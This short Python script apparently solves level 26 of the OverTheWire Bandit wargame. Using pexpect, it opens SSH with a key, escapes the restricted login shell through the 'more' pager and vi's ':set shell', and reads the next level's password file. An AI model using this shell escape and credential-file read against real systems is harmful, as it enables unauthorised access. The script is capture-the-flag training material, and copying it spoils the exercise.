import pexpect

child = pexpect.spawn(
    "ssh -i sshkey_lvl26.private -p 2220 bandit26@bandit.labs.overthewire.org",
    encoding="utf-8",
    dimensions=(5,20)
)

child.expect(r"--More--")

child.delaybeforesend = 0.5

child.send("v")

child.delaybeforesend = 0.5

child.sendline(":set shell=/bin/bash")
child.sendline(":shell")

child.delaybeforesend = 0.5

child.sendline("cat /etc/bandit_pass/bandit26")

child.expect([r"[A-Za-z0-9]{32}"])

print(child.after)